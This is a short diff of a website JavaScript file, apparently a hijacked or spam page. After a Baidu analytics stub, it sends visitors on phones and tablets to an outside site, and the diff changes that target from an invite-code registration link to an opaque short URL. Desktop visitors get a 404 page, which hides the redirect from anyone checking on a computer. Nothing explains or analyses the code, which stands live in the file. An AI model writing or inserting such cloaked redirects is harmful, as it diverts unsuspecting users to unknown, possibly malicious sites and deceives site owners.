@@ -7,7 +7,7 @@ var _hmt = _hmt || [];
 })();
 
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	window.location.href="https://www.j1st7.com:9007/entry/register/?i_code=39290091";
+	window.location.href="http://5fxxo.com/BM3wFzr";
 }else{
 	window.location.href="/404.html";
 }
